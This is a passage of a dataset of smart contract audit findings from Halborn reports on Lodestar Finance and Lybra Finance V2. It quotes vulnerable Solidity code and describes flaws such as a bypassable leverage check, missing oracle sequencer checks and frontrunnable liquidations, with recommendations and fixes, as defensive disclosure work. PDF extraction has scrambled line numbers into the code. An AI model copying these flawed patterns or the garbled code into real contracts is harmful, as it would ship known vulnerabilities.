REVERTING", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Lodestar_Lodestar_Finance_Smart_Contract_Security_Assessment_Report_Halborn_Final.pdf", "body": "The contract Ploopy allows looping with the following assets: - USDC: Borrows USDC, repays with USDC. - USDT: Borrows USDT, repays with USDT. - DAI: Borrows DAI, repays with DAI. - WBTC: Borrows WBTC, repays with WBTC. - FRAX: Borrows FRAX, repays with FRAX. - ARB: Borrows ARB, repays with ARB. - plvGLP: Borrows USDC, repays with plvGLP. As we can see below, when users loop with the plvGLP token, a different logic is performed: Listing 12: Ploopy.sol (Line 118) 112 function loop ( IERC20 _token , uint256 _amount , uint16 _leverage ,  uint16 _useWalletBalance ) external { 113 114 115 116 require ( allowedTokens [ _token ], \" token not allowed to loop \" ); require ( tx . origin == msg . sender , \" not an EOA \"); require ( _amount > 0, \" amount must be greater than 0 \" ); require ( _leverage >= DIVISOR && _leverage <= MAX_LEVERAGE , \"  invalid leverage , range must be between DIVISOR and MAX_LEVERAGE  values \"); 117 118 // if the user wants us to mint using their existing wallet  balance ( indiciated with 1) , then do so . 119 // otherwise , read their existing balance and flash loan to  increase their position 120 121 if ( _useWalletBalance == 1) { // transfer tokens to this contract so we can mint in 1 go . 36 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 _token . safeTransferFrom ( msg . sender , address ( this ) , _amount ); emit Transfer ( msg . sender , address ( this ) , _amount ); } uint256 loanAmount ; IERC20 _tokenToBorrow ; if ( _token == PLVGLP ) { uint256 _tokenPriceInEth ; uint256 _usdcPriceInEth ; uint256 _computedAmount ; // plvGLP borrows USDC to loop _tokenToBorrow = USDC ; _tokenPriceInEth = PRICE_ORACLE . getUnderlyingPrice ( address (  lTokenMapping [ _token ]) ); 137 _usdcPriceInEth = ( PRICE_ORACLE . getUnderlyingPrice ( address (  lUSDC )) / 1 e12 ); 138 _computedAmount = ( _amount * ( _tokenPriceInEth /  _usdcPriceInEth )); 139 140 141 142 143 144 145 loanAmount = getNotionalLoanAmountIn1e18 ( _computedAmount , _leverage ); } else { // the rest of the contracts just borrow whatever token is  supplied 146 147 148 _tokenToBorrow = _token ; loanAmount = getNotionalLoanAmountIn1e18 ( _amount , // we can just send over the exact amount , as we  are either looping stables or eth 149 150 151 152 153 _leverage ); } if ( _tokenToBorrow . balanceOf ( address ( BALANCER_VAULT )) <  loanAmount ) revert FAILED ( ' balancer vault token balance < loan '); 154 155 emit Loan ( loanAmount ); emit BalanceOf ( _tokenToBorrow . balanceOf ( address ( BALANCER_VAULT ))  , loanAmount ); 156 157 158 // check approval to spend USDC ( for paying back flashloan ). // possibly can omit to save gas as tx will fail with exceed 37  allowance anyway . 159 if ( _tokenToBorrow . allowance ( msg . sender , address ( this )) <  loanAmount ) revert INVALID_APPROVAL () ; 160 emit Allowance ( _tokenToBorrow . allowance ( msg . sender , address ( this  )) , loanAmount ); 161 162 163 164 165 166 167 168 169 170 171 172 173 174 175 IERC20 [] memory tokens = new IERC20 [](1) ; tokens [0] = _tokenToBorrow ; uint256 [] memory loanAmounts = new uint256 [](1) ; loanAmounts [0] = loanAmount ; UserData memory userData = UserData ({ user : msg . sender , tokenAmount : _amount , borrowedToken : _tokenToBorrow , borrowedAmount : loanAmount , tokenToLoop : _token }) ; emit UserDataEvent ( msg . sender , _amount , address ( _tokenToBorrow ) ,  loanAmount , address ( _token )) ; 176 177 BALANCER_VAULT . flashLoan ( IFlashLoanRecipient ( this ) , tokens ,  loanAmounts , abi . encode ( userData )); 178 } 179 180 In this case , the ` _tokenToBorrow ` will be USDC . Although , during  the repayment of the flashloan , the contract tries to repay with  plvGLP token instead of USDC : 181 ``` { language = solidity firstnumber = \" 164 \" caption = \" Ploopy . sol \"  hlines =214 -217} IERC20 [] memory tokens , uint256 [] memory amounts , uint256 [] memory feeAmounts , bytes memory userData 182 function receiveFlashLoan ( 183 184 185 186 187 ) external override nonReentrant { 188 if ( msg . sender != address ( BALANCER_VAULT )) revert UNAUTHORIZED ( '  balancer vault is not the sender '); 189 190 191 192 193 // additional checks ? UserData memory data = abi . decode ( userData , ( UserData )) ; if ( data . borrowedAmount != amounts [0] || data . borrowedToken != 38  tokens [0]) revert FAILED ( ' borrowed amounts and / or borrowed tokens  do not match initially set values '); 194 195 196 197 198 199 200 201 202 203 204 205 206 207 208 209 210 211 212 213 214 215 216 217 // sanity check : flashloan has no fees if ( feeAmounts [0] > 0) revert FAILED ( ' balancer fee > 0 '); // account for some plvGLP specific logic if ( data . tokenToLoop == PLVGLP ) { // mint GLP . approval needed . uint256 glpAmount = REWARD_ROUTER_V2 . mintAndStakeGlp ( address ( data . borrowedToken ) , data . borrowedAmount , 0, 0 ); if ( glpAmount == 0) revert FAILED ( ' glp =0 '); // TODO whitelist this contract for plvGLP mint // mint plvGLP . approval needed . uint256 _oldPlvglpBal = PLVGLP . balanceOf ( address ( this )) ; GLP_DEPOSITOR . deposit ( glpAmount ); // check new balances and confirm we properly minted uint256 _newPlvglpBal = PLVGLP . balanceOf ( address ( this )) ; emit plvGLPBalance ( _newPlvglpBal ); require ( _newPlvglpBal > _oldPlvglpBal , \" glp deposit failed ,  new balance < old balance \" ); 218 219 220 221 222 } uint256 _finalBal ; // mint our respective token by depositing it into Lodestar 's  respective lToken contract ( approval needed ) 223 224 unchecked { lTokenMapping [ data . tokenToLoop ]. mint ( data . tokenToLoop .  balanceOf ( address ( this )) ); 225 lTokenMapping [ data . tokenToLoop ]. transfer ( data . user ,  lTokenMapping [ data . tokenToLoop ]. balanceOf ( address ( this )) ); 226 _finalBal = lTokenMapping [ data . tokenToLoop ]. balanceOf ( address (  this )); 227 228 229 emit lTokenBalance ( _finalBal ); require ( _finalBal == 0 , \" lToken balance not 0 at the end of  loop \"); 39 230 231 232 233 } // call borrowBehalf to borrow tokens on behalf of user lTokenMapping [ data . tokenToLoop ]. borrowBehalf ( data . borrowedAmount  , data . user ); 234 235 // repay loan , where msg . sender = vault data . tokenToLoop . safeTransferFrom ( data . user , msg . sender , data .  borrowedAmount ); 236 } As the repayment of the flash loan is done with the wrong token, the the reverts INVALID_POST_LOAN_BALANCE. transaction following BAL#515 - error: with BVSS: AO:A/AC:L/AX:L/C:N/I:N/A:H/D:N/Y:N/R:N/S:U (7.5) Recommendation: It is recommended to update the receiveFlashLoan() function so, in the case that the tokenToLoop is plvGLP, the repayment is done with USDC. Remediation Plan: SOLVED: The Lodestar team solved the issue by implementing the recommended solution. Commit ID : 306d538a0b295fb96b37ccd774c27fb658b0538f. 40 ", "labels": ["Halborn", "Lodestar_Lodestar_Finance", "Severity: High"]}, {"title": "PLOOPY LEVERAGE CALCULATION IS WRONGLY IMPLEMENTED", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Lodestar_Lodestar_Finance_Smart_Contract_Security_Assessment_Report_Halborn_Final.pdf", "body": "In the Ploopy contract, the function loop() allows users to loop to a desired leverage, within a pre-set range of 1x to 3x leverage: Listing 13: Ploopy.sol (Lines 140,147) 112 function loop ( IERC20 _token , uint256 _amount , uint16 _leverage ,  uint16 _useWalletBalance ) external { 113 114 115 116 require ( allowedTokens [ _token ], \" token not allowed to loop \" ); require ( tx . origin == msg . sender , \" not an EOA \"); require ( _amount > 0, \" amount must be greater than 0 \" ); require ( _leverage >= DIVISOR && _leverage <= MAX_LEVERAGE , \"  invalid leverage , range must be between DIVISOR and MAX_LEVERAGE  values \"); 117 118 // if the user wants us to mint using their existing wallet  balance ( indiciated with 1) , then do so . 119 // otherwise , read their existing balance and flash loan to  increase their position 120 121 122 123 124 125 126 127 128 129 130 131 132 if ( _useWalletBalance == 1) { // transfer tokens to this contract so we can mint in 1 go . _token . safeTransferFrom ( msg . sender , address ( this ) , _amount ); emit Transfer ( msg . sender , address ( this ) , _amount ); } uint256 loanAmount ; IERC20 _tokenToBorrow ; if ( _token == PLVGLP ) { uint256 _tokenPriceInEth ; uint256 _usdcPriceInEth ; uint256 _computedAmount ; 41 133 134 135 136 // plvGLP borrows USDC to loop _tokenToBorrow = USDC ; _tokenPriceInEth = PRICE_ORACLE . getUnderlyingPrice ( address (  lTokenMapping [ _token ]) ); 137 _usdcPriceInEth = ( PRICE_ORACLE . getUnderlyingPrice ( address (  lUSDC )) / 1 e12 ); 138 _computedAmount = ( _amount * ( _tokenPriceInEth /  _usdcPriceInEth )); 139 140 141 142 143 144 145 loanAmount = getNotionalLoanAmountIn1e18 ( _computedAmount , _leverage ); } else { // the rest of the contracts just borrow whatever token is  supplied 146 147 148 _tokenToBorrow = _token ; loanAmount = getNotionalLoanAmountIn1e18 ( _amount , // we can just send over the exact amount , as we  are either looping stables or eth 149 150 151 152 153 _leverage ); } if ( _tokenToBorrow . balanceOf ( address ( BALANCER_VAULT )) <  loanAmount ) revert FAILED ( ' balancer vault token balance < loan '); 154 155 emit Loan ( loanAmount ); emit BalanceOf ( _tokenToBorrow . balanceOf ( address ( BALANCER_VAULT ))  , loanAmount ); 156 157 158 // check approval to spend USDC ( for paying back flashloan ). // possibly can omit to save gas as tx will fail with exceed  allowance anyway . 159 if ( _tokenToBorrow . allowance ( msg . sender , address ( this )) <  loanAmount ) revert INVALID_APPROVAL () ; 160 emit Allowance ( _tokenToBorrow . allowance ( msg . sender , address ( this  )) , loanAmount ); 161 162 163 164 165 166 IERC20 [] memory tokens = new IERC20 [](1) ; tokens [0] = _tokenToBorrow ; uint256 [] memory loanAmounts = new uint256 [](1) ; loanAmounts [0] = loanAmount ; 42 167 168 169 170 171 172 173 174 175 UserData memory userData = UserData ({ user : msg . sender , tokenAmount : _amount , borrowedToken : _tokenToBorrow , borrowedAmount : loanAmount , tokenToLoop : _token }) ; emit UserDataEvent ( msg . sender , _amount , address ( _tokenToBorrow ) ,  loanAmount , address ( _token )) ; 176 177 BALANCER_VAULT . flashLoan ( IFlashLoanRecipient ( this ) , tokens ,  loanAmounts , abi . encode ( userData )); 178 } In order to calculate the amount of tokens loaned, the internal view function getNotionalLoanAmountIn1e18() is called: Listing 14: Ploopy.sol (Line 225) 220 function getNotionalLoanAmountIn1e18 ( uint256 _notionalTokenAmountIn1e18 , 221 222 uint16 _leverage 223 ) private pure returns ( uint256 ) { 224 225 unchecked { return (( _leverage - DIVISOR ) * _notionalTokenAmountIn1e18 ) /  DIVISOR ; } 226 227 } After the loanAmount is calculated, a flash loan is taken from the Balancer Vault, the flash loaned tokens are used to mint more cTokens and then those tokens are borrowed from the Lodestar market to repay the flash loan. Although, the leverage calculation or the term leverage is wrongly used here as it simply defines the amount of assets that will be flash loaned from Balancer without considering the current position of the user in Lodestar. For example, lets imagine these 2 different situations: 43 Situation 1 User1 initial liquidity: - liquidity: 4_907186648501354500 - shortfall: 0 Uner1 initial snapshot: - cWantBalance: 50000000000000 - borrowed: 0 - exchangeRate: 200000000000000 User1 calls: contract_Ploopy.loop(USDC, 1000e6, 30000, 0) - 2000_000000 USDC is flash loaned from Balancer Vault. - mint() is called, minting more cTokens. - 100000_00000000 cTokens are transferred to user1. - 2000_000000 USDC are borrowed from the lUSDC market. - This 2000_000000 USDC is used to repay the Balancers flash loan. User1 final liquidity: - liquidity: 4_734319793085926400 - shortfall: 0 Uner1 final snapshot: - cWantBalance: 60000000000000 - borrowed: 2000000000 - exchangeRate: 200000000000000 Situation 2 User1 initial liquidity: - liquidity: 4_907186648501354500 - shortfall: 0 Uner1 initial snapshot: - cWantBalance: 50000000000000 - borrowed: 0 - exchangeRate: 200000000000000 User1 calls: contract_Ploopy.loop(USDC, 2000e6, 20000, 0) - 2000_000000 USDC is flash loaned from Balancer Vault. - mint() is called, minting more cTokens. - 100000_00000000 cTokens are transferred to user1. - 2000_000000 USDC are borrowed from the lUSDC market. 44 - This 2000_000000 USDC is used to repay the Balancers flash loan. User1 final liquidity: - liquidity: 4_734319793085926400 - shortfall: 0 Uner1 final snapshot: - cWantBalance: 60000000000000 - borrowed: 2000000000 - exchangeRate: 200000000000000 As we can see, both situations end up flash loaning 2000 USDC from Balancer and getting the user1 Lodestars position to the same liquidity. Hence, the leverage check of being between 1x and 3x can be easily bypassed as the user can simply call the loop() function with a higher _amount. BVSS: AO:A/AC:L/AX:L/C:N/I:L/A:N/D:M/Y:N/R:N/S:U (5.6) 45 Recommendation: Consider refactoring the loop() function and the Ploopy contract in general, so the looping considers the current position of the user in Lodestar to calculate the leverage. Remediation Plan: SOLVED: The Lodestar team solved the issue by implementing the recommended solution. Commit ID : 164063788549a7b9db59284c36eab7905d76dcc6. 46 ", "labels": ["Halborn", "Lodestar_Lodestar_Finance", "Severity: Medium"]}, {"title": "SEQUENCER STATUS IS NOT CHECKED FOR LPLVGLP PRICE", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Lodestar_Lodestar_Finance_Smart_Contract_Security_Assessment_Report_Halborn_Final.pdf", "body": "In the PriceOracleProxyETH contract the function getUnderlyingPrice() gets the underlying price of a listed cToken asset: Listing 15: PriceOracleProxyETH.sol (Line 108) * @notice Get the underlying price of a listed cToken asset * @param cToken The cToken to get the underlying price of * @return The underlying asset price mantissa ( scaled by 1 e18 ) 92 /* * 93 94 95  Price is given in ether (1 e18 = 1 ether ) 96 97 function getUnderlyingPrice ( CToken cToken ) public view returns (  uint256 ) { 98 99  cTokenAddress ]; address cTokenAddress = address ( cToken ); AggregatorInfo memory aggregatorInfo = aggregators [ */ 100 101 102 103 104 105 if ( cTokenAddress == letherAddress ) { uint256 price = 1 e18 ; return price ; } else if ( cTokenAddress == lplvGLPAddress ) { uint256 price = getPlvGLPPrice () ; price = div_ ( price , Exp ({ mantissa : getPriceFromChainlink (  ethUsdAggregator ) }) ); return price ; 106 107 108 } else if ( address ( aggregatorInfo . source ) != address (0) ) { bool sequencerStatus = getSequencerStatus ( sequencerAddress  ); 109  source ); uint256 price = getPriceFromChainlink ( aggregatorInfo . 110 if ( sequencerStatus == false ) { 47 111 // If flag is raised we shouldn 't perform any critical  operations 112 113 114 115 revert (\" Chainlink feeds are not being updated \"); } else if ( aggregatorInfo . base == AggregatorBase . USD ) { // Convert the price to ETH based if it 's USD based . price = div_ ( price , Exp ({ mantissa :  getPriceFromChainlink ( ethUsdAggregator ) }) ); 116 uint256 underlyingDecimals = EIP20Interface ( CErc20 (  cTokenAddress ). underlying () ). decimals () ; 117 118 119 return price * 10 ** (18 - underlyingDecimals ); } else if ( aggregatorInfo . base == AggregatorBase . ETH ) { uint256 underlyingDecimals = EIP20Interface ( CErc20 (  cTokenAddress ). underlying () ). decimals () ; 120 121 122 123 124 } return price * 10 ** (18 - underlyingDecimals ); } } revert ( \" Invalid Oracle Request \" ); In the line 108, a call is done to the sequencer feed in order to check its status and revert in case that the sequencer is down. Although, this should also be checked when cTokenAddress == lplvGLPAddress as a call to the ethUsdAggregator is also done. This could lead to get an outdated price from the ethUsdAggregator. BVSS: AO:A/AC:L/AX:L/C:N/I:N/A:N/D:M/Y:N/R:N/S:U (5.0) Recommendation: It is recommended to update the getUnderlyingPrice() function as shown below: Listing 16: PriceOracleProxyETH.sol (Lines 100,105,106,107,108) 92 /* * 93 94 * @notice Get the underlying price of a listed cToken asset * @param cToken The cToken to get the underlying price of 48 */ * @return The underlying asset price mantissa ( scaled by 1 e18 ) 95  Price is given in ether (1 e18 = 1 ether ) 96 97 function getUnderlyingPrice ( CToken cToken ) public view returns (  uint256 ) { 98 99  cTokenAddress ]; address cTokenAddress = address ( cToken ); AggregatorInfo memory aggregatorInfo = aggregators [ 100 101 102 103 104 105 106 107 108 109 110 bool sequencerStatus ; if ( cTokenAddress == letherAddress ) { uint256 price = 1 e18 ; return price ; } else if ( cTokenAddress == lplvGLPAddress ) { sequencerStatus = getSequencerStatus ( sequencerAddress ); if ( sequencerStatus == false ){ revert (\" Chainlink feeds are not being updated \"); } uint256 price = getPlvGLPPrice () ; price = div_ ( price , Exp ({ mantissa : getPriceFromChainlink (  ethUsdAggregator ) }) ); return price ; 111 112 113 114 } else if ( address ( aggregatorInfo . source ) != address (0) ) { sequencerStatus = getSequencerStatus ( sequencerAddress ); uint256 price = getPriceFromChainlink ( aggregatorInfo .  source ); 115 116 if ( sequencerStatus == false ) { // If flag is raised we shouldn 't perform any critical  operations 117 118 119 120 revert (\" Chainlink feeds are not being updated \"); } else if ( aggregatorInfo . base == AggregatorBase . USD ) { // Convert the price to ETH based if it 's USD based . price = div_ ( price , Exp ({ mantissa :  getPriceFromChainlink ( ethUsdAggregator ) }) ); 121 uint256 underlyingDecimals = EIP20Interface ( CErc20 (  cTokenAddress ). underlying () ). decimals () ; 122 123 124 return price * 10 ** (18 - underlyingDecimals ); } else if ( aggregatorInfo . base == AggregatorBase . ETH ) { uint256 underlyingDecimals = EIP20Interface ( CErc20 (  cTokenAddress ). underlying () ). decimals () ; 125 126 127 128 129 } return price * 10 ** (18 - underlyingDecimals ); } } revert ( \" Invalid Oracle Request \" ); 49 Remediation Plan: SOLVED: The Lodestar team solved the issue by implementing the recommended solution. Commit ID : 241ad9405b6b0d950eca14faeb3a7bf2fd18c824. 50 ", "labels": ["Halborn", "Lodestar_Lodestar_Finance", "Severity: Medium"]}, {"title": "SWAPTHROUGHUNISWAP CALL WILL ALWAYS REVERT AS NATIVEUSDC WILL ALWAYS BE ZERO", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Lodestar_Lodestar_Finance_Smart_Contract_Security_Assessment_Report_Halborn_Final.pdf", "body": "In the Loopy contract, in the receiveFlashloan() function, in the specific logic related to the USDC market, the following call is executed: Listing 17: Loopy.sol 326 lUSDC . borrowBehalf ( repayAmountFactoringInFeeAmount , data . user ); Although, the This call will borrow and send USDC to the data.user. contract assumes that this USDC amount will be received by the contract itself: Listing 18: Loopy.sol 327 // we need to swap our native USDC for bridged USDC to repay the  loan 328 uint256 nativeUSDCBalance = USDC_NATIVE . balanceOf ( address ( this )) ; For this reason, the variable nativeUSDCBalance will always be zero, reverting during the Swap.swapThroughUniswap() call, as the amountIn will be zero. BVSS: AO:A/AC:L/AX:L/C:N/I:M/A:N/D:N/Y:N/R:N/S:U (5.0) 51 Recommendation: It is recommended to transfer the USDC_NATIVE from the data.user to the Loopy contract before the swapThroughUniswap() call. Remediation Plan: SOLVED: The Lodestar team solved the issue by implementing the recommended solution. Commit ID : 7c706d50739de365cff6b46739f5e71bf37db4ac. 52 ", "labels": ["Halborn", "Lodestar_Lodestar_Finance", "Severity: Medium"]}, {"title": "MISSING INITIAL SWAP CALL TO CONVERT USDCBRIDGED INTO USDCNATIVE BEFORE MINTING", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Lodestar_Lodestar_Finance_Smart_Contract_Security_Assessment_Report_Halborn_Final.pdf", "body": "In the Loopy contract some special logic was implemented as the new USDC market deployed will use USDC_NATIVE while the balancers vault uses USDC_BRIDGED. Basically, when looping with USDC_NATIVE, USDC_BRIDGED is flash loaned. Although, as the underlying of the USDC market is USDC_NATIVE, a swap from USDC_BRIDGED to USDC_NATIVE is needed in order to call mint() in the USDC market. This initial swap is missing in the code. For this reason, any loop() call with _useWalletBalance == 0 will revert. BVSS: AO:A/AC:L/AX:L/C:N/I:M/A:N/D:N/Y:N/R:N/S:U (5.0) Recommendation: It is recommended to implement the missing initial swap from USDC_BRIDGED to USDC_NATIVE in the Loopy.receiveFlashLoan() function. Remediation Plan: SOLVED: The Lodestar team solved the issue by implementing the recommended solution. 53 Commit ID : 7c706d50739de365cff6b46739f5e71bf37db4ac. 54 ", "labels": ["Halborn", "Lodestar_Lodestar_Finance", "Severity: Medium"]}, {"title": "USEWALLETBALANCE PARAMETER IS NOT USED CORRECTLY", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Lodestar_Lodestar_Finance_Smart_Contract_Security_Assessment_Report_Halborn_Final.pdf", "body": "In the Ploopy contract, the function loop() contains the parameter _useWalletBalance. This parameter is used in case that the user wants the contract to mint using their existing wallet balance. Otherwise, the contract should read his existing balance and flash loan to increase his position. This logic is not correctly implemented, as the contract will always take a flash loan. For example, with the following loop() parameters: - _token = USDC - _amount = 1000e6 - _leverage = 20000 - _useWalletBalance = 1 1000e6 USDC will be transferred to the smart contract, then a flash loan of another 1000e6 will be taken, and 2000e6 USDC in total will be minted for lUSDC. In the case that, _useWalletBalance is set to 1, a flash loan should not be taken, and the contract should simply call mint() to transfer the cTokens to the user and then call the borrowBehalf() function. BVSS: AO:A/AC:L/AX:L/C:N/I:L/A:N/D:L/Y:N/R:N/S:C (3.9) 55 Recommendation: It is recommended to correct the logic of the loop() function, so it does not take a flash loan when _useWalletBalance is set to 1. Remediation Plan: SOLVED: The Lodestar team solved the issue by implementing the recommended solution. Commit ID : 164063788549a7b9db59284c36eab7905d76dcc6. 56 4.10 (HAL-10) BLOCKSPERYEAR ARE NOT CORRECTLY ADJUSTED IN THE RATE MODELS - LOW (3.1) Commit IDs affected: - d19be010dea56ba706449e68d394591e97b30916 ", "labels": ["Halborn", "Lodestar_Lodestar_Finance", "Severity: Informational"]}, {"title": "CURVEPOOL.EXCHANGEUNDERLYING(", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Lybra_Finance_V2_Smart_Contract_Security_Assessment_Report_Halborn_Final.pdf", "body": "In the LybraConfigurator contract, the function distributeRewards() in- ternally calls the curvePool.exchange_underlying() function to convert eUSD into peUSD: Listing 1: LybraConfigurator.sol (Line 323) uint256 balance = EUSD . balanceOf ( address ( this )); if ( balance >= 1 e21 ) { 316 function distributeRewards () external { 317 318 319 320 321 322 323 if ( premiumTradingEnabled ){ (, int price , , , ) = eUSDPriceFeed . latestRoundData () ; if ( price >= 100 _500_000 ){ EUSD . approve ( address ( curvePool ) , balance ); uint256 amount = curvePool . exchange_underlying (0 ,  2, balance , balance * uint ( price ) * 998 / 1 e23 ); 324 IERC20 ( stableToken ). safeTransfer ( address (  lybraProtocolRewardsPool ) , amount ); 325  , 1) ; 326 lybraProtocolRewardsPool . notifyRewardAmount ( amount emit SendProtocolRewards ( stableToken , amount ,  block . timestamp ); 327 328 329 330 331 332 } } else { peUSD . convertToPeUSD ( address ( this ) , balance ); } } uint256 peUSDBalance = peUSD . balanceOf ( address ( this )) ; 22 333 334 if ( peUSDBalance >= 1 e21 ) { peUSD . transfer ( address ( lybraProtocolRewardsPool ) ,  peUSDBalance ); 335  0) ; 336 lybraProtocolRewardsPool . notifyRewardAmount ( peUSDBalance , emit SendProtocolRewards ( address ( peUSD ) , peUSDBalance ,  block . timestamp ); 337 338 } } This call makes 2 assumptions wrongly: 1. Assumes that the USDC price will always be pegged to 1 USD. 2. Sets a maximum slippage of 0.2%. As most of the Curve Pools have by default a 0.015% total fee (DAO fee + protocol fee) and USDC price may not be exactly pegged to 1 USD it is entirely possible that the curvePool.exchange_underlying() call reverts due to high slippage. In that case, any distributeRewards() call would revert leaving the ProtocolRewards contract without rewards. BVSS: AO:A/AC:L/AX:L/C:N/I:H/A:N/D:N/Y:N/R:N/S:U (7.5) Recommendation: It is recommended to calculate the price of USDC with high precision using an external oracle. It is also recommended to implement a setter to update the maximum slippage tolerance in the curvePool.exchange_underlying() call. Remediation Plan: SOLVED: The Lybra Finance team solved the issue by increasing the maximum slippage to 0.5%. Commit ID : 8c4ec31df7978acd25bd8eb95a22dc056a9be553. 23 ", "labels": ["Halborn", "Lybra_Finance_V2", "Severity: High"]}, {"title": "PEUSD.CONVERTTOPEUSD(", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Lybra_Finance_V2_Smart_Contract_Security_Assessment_Report_Halborn_Final.pdf", "body": "In the LybraConfigurator contract, the function distributeRewards() in- ternally calls PeUSDMainnet.convertToPeUSD() function to exchange eUSD for USDC: Listing 2: LybraConfigurator.sol (Line 329) uint256 balance = EUSD . balanceOf ( address ( this )); if ( balance >= 1 e21 ) { 316 function distributeRewards () external { 317 318 319 320 321 322 323 if ( premiumTradingEnabled ){ (, int price , , , ) = eUSDPriceFeed . latestRoundData () ; if ( price >= 100 _500_000 ){ EUSD . approve ( address ( curvePool ) , balance ); uint256 amount = curvePool . exchange_underlying (0 ,  2, balance , balance * uint ( price ) * 998 / 1 e23 ); 324 IERC20 ( stableToken ). safeTransfer ( address (  lybraProtocolRewardsPool ) , amount ); 325  , 1) ; 326 lybraProtocolRewardsPool . notifyRewardAmount ( amount emit SendProtocolRewards ( stableToken , amount ,  block . timestamp ); 327 328 329 330 331 332 333 } } else { peUSD . convertToPeUSD ( address ( this ) , balance ); } } uint256 peUSDBalance = peUSD . balanceOf ( address ( this )) ; if ( peUSDBalance >= 1 e21 ) { 24 334 peUSD . transfer ( address ( lybraProtocolRewardsPool ) ,  peUSDBalance ); 335  0) ; 336 lybraProtocolRewardsPool . notifyRewardAmount ( peUSDBalance , emit SendProtocolRewards ( address ( peUSD ) , peUSDBalance ,  block . timestamp ); 337 338 } } Although, this call could always revert as there is a limit of peUSD that can be minted by using eUSD which is given by the LybraConfigurator .getEUSDMaxLocked() function: Listing 3: PeUSDMainnet.sol (Line 78) * @param eusdAmount The amount of eUSD to deposit and mint peUSD * @notice Allows the user to deposit eUSD and mint peUSD tokens . * @param user The address of the user who wants to deposit eUSD 70 /* * 71 72  and mint peUSD . It can only be the contract itself or the msg .  sender . 73  tokens . 74 */ 75 function convertToPeUSD ( address user , uint256 eusdAmount ) public { 76 require ( _msgSender () == user || _msgSender () == address ( this ) ,  \" MDM \" ); 77 78  configurator . getEUSDMaxLocked () ,\" ESL \" ); 79  eusdAmount ); 80 81  getSharesByMintedEUSD ( eusdAmount ); 82 83 84  timestamp ); 85 } userConvertInfo [ user ]. mintedPeUSD += eusdAmount ; _mint ( user , eusdAmount ); emit ConvertToPeUSD ( msg . sender , eusdAmount , eusdAmount , block . require ( eusdAmount != 0 , \" ZA \"); require ( EUSD . balanceOf ( address ( this )) + eusdAmount <= require ( success , \" TF \" ); userConvertInfo [ user ]. depositedEUSDShares += EUSD . bool success = EUSD . transferFrom ( user , address ( this ) , If this limit is reached and the price of eUSD is lower than 1,005 USD, 25 any distributeRewards() call would revert, leaving the ProtocolRewards contract without rewards. BVSS: AO:A/AC:L/AX:L/C:N/I:H/A:N/D:N/Y:N/R:N/S:U (7.5) Recommendation: It is recommended to add a check to the convertToPeUSD() function that if it is used for dividend conversion, it will not be subject to the getEUSDMaxLocked() limitation. Remediation Plan: SOLVED: The Lybra Finance team solved the issue by implementing the rec- ommended solution. Commit ID : d050e08072633dcccd69155a36901c9434dfdb58. 26 ", "labels": ["Halborn", "Lybra_Finance_V2", "Severity: High"]}, {"title": "LYBRACONFIGURATOR CONTRACT ASSUMES THAT THE USDC PRICE WILL BE ALWAYS PEGGED TO 1 USD", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Lybra_Finance_V2_Smart_Contract_Security_Assessment_Report_Halborn_Final.pdf", "body": "The LybraConfigurator.distributeRewards() function, under certain condi- tions, exchanges eUSD for USDC using Curve. This function assumes that the USDC price will always remain pegged to 1 USD. This assumption introduces several concerns: 1. Peg Deviation: Even though USDC is a stablecoin designed to maintain a peg to the US dollar, theres no guarantee it will always be exactly 1 dollar. Market dynamics, liquidity concerns, or unforeseen events can cause temporary or even long-term deviations. 2. Contract Logic Vulnerability: If the contracts logic heavily re- lies on the USDC being always pegged at 1 dollar, any deviation can result in incorrect calculations, leading to potential losses, denial of service or other undesired outcomes. 3. Reduced Resilience to Black Swan Events: In the case of unprece- dented events in the crypto space, USDC, like any other asset, can face challenges. Banking issues, regulatory crackdowns, or problems with Circle (the issuer of USDC) might affect the peg. 4. Arbitrage Opportunities: If USDC diverges from its $1 peg and the contract assumes its always $1, it can create arbitrage opportuni- ties. Malicious actors might exploit these to drain funds or gain unfair advantages. For all these reasons, it is always recommended to use an external oracle 27 to retrieve and validate the price of USDC with high precision, preventing all the risks mentioned above. BVSS: AO:A/AC:L/AX:L/C:N/I:M/A:N/D:N/Y:N/R:N/S:C (6.2) Recommendation: It is recommended to use an external oracle to retrieve and validate the price of USDC with high precision. Remediation Plan: RISK ACCEPTED: The Lybra Finance team accepted the risk of this finding. 28 ", "labels": ["Halborn", "Lybra_Finance_V2", "Severity: Medium"]}, {"title": "LIQUIDATION CALLS CAN BE FRONTRUN STEALING THE REWARD2KEEPER FEE", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Lybra_Finance_V2_Smart_Contract_Security_Assessment_Report_Halborn_Final.pdf", "body": "In the LybraPeUSDVaultBase contract, the function liquidation() liqui- dates borrowers whose collateral ratio is below badCollateralRatio, using peUSD provided by the Liquidation Provider: Listing 4: LybraPeUSDVaultBase.sol (Line 132) 114 /* * 115 * @notice Keeper liquidates borrowers whose collateral ratio is  below badCollateralRatio , using peUSD provided by Liquidation  Provider . 116 117 118 * * Requirements : * - onBehalfOf Collateral Ratio should be below  badCollateralRatio 119 120 121 * - assetAmount should be less than 50% of collateral * - provider should authorize Lybra to utilize peUSD * @dev After liquidation , borrower 's debt is reduced by  assetAmount * assetPrice , providers and keepers can receive up to  an additional 10% liquidation reward . */ 122 123 function liquidation ( address provider , address onBehalfOf , uint256  assetAmount ) external virtual { 124 125 uint256 assetPrice = getAssetPrice () ; uint256 onBehalfOfCollateralRatio = ( depositedAsset [ onBehalfOf  ] * assetPrice * 100) / getBorrowedOf ( onBehalfOf ); 126 require ( onBehalfOfCollateralRatio < configurator .  getBadCollateralRatio ( address ( this )) , \" Borrowers collateral ratio  should below badCollateralRatio \" ); 127 128 require ( assetAmount * 2 <= depositedAsset [ onBehalfOf ], \" a max  of 50% 